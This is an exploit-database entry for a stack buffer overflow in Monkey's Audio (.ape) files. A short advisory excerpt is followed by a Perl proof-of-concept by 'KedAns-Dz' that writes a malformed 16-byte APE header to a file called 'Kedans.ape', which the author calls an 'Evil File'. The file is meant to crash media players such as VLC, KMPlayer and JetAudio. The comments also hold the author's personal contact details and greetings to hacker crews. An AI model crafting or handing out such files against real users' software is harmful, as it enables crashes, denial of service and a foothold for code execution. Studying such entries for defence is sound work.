source: http://www.securityfocus.com/bid/46887/info

Monkey�??s Audio is prone to a stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Successfully exploiting this issue allows attackers to execute arbitrary code in the context of the vulnerable application. Failed exploit attempts will result in a denial-of-service condition.

#!/usr/bin/perl

###
# Title : Monkey's File Audio (All MPlayers) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Overflow & Crash's
# Tested on : Windows XP SP3 Fran?ais 
# Target : All Media Players
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# File Home : (http://www.monkeysaudio.com)
# Error's Detected : 
# Media Player Classic v6.4.9.1 [MonkeySource.ax !0x020451a6()!] >> http://1337day.com/exploits/15581  || By KedAns-Dz
# JetAudio v5.1.5.2 [JFACMDec.dll !0x02FA1BBD()!] >> http://packetstormsecurity.org/files/view/99200/jetaudio5152ape-overflow.txt  || By KedAns-Dz
# KMPlayer 2.9.3 [MACDec.dll !0x??????()!] >> http://packetstormsecurity.org/files/view/99190/kmplayerape-overflow.txt  || By KedAns-Dz 
# VLC media player v1.0.5 [axvlc.dll !0x??????()!] >> http://1337day.com/exploits/15595  || By KedAns-Dz
# QuickTime Player [Not Detected !!] ' Because Can not Read (APE) Files Format
# RealPlayer [Not Detected !!] ' Because Can not Read (APE) Files Format
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |======================================================|\n";
print "    |= [!] Name : Monkey's File Audio (.ape) All Players  =|\n";
print "    |= [!] Exploit : Stack Buffer Overflow                =|\n";
print "    |= [!] Author : KedAns-Dz                             =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                 =|\n";
print "    |======================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x41\x43\x20\x96\x0f\x00\x00\x34\x00\x00\x00\x18\x00\x00\x00"; # APE Header (16 bytes)
open(file , ">", "Kedans.ape"); # Evil File APE (4.0 KB)
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# Special Greets to : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz * His0k4 * Dr.0rYX 
# Cr3w-DZ * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# [ Special Greets to 3 em EnGineering Electric Class , BACALORIA 2011 Enchallah 
# Messas Secondary School - Ain mlilla - 04300 - Algeria ] ,
# Greets All Bad Boys (cit? 1850 logts - HassiMessaouD - 30008 -Algeria ) ,
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================
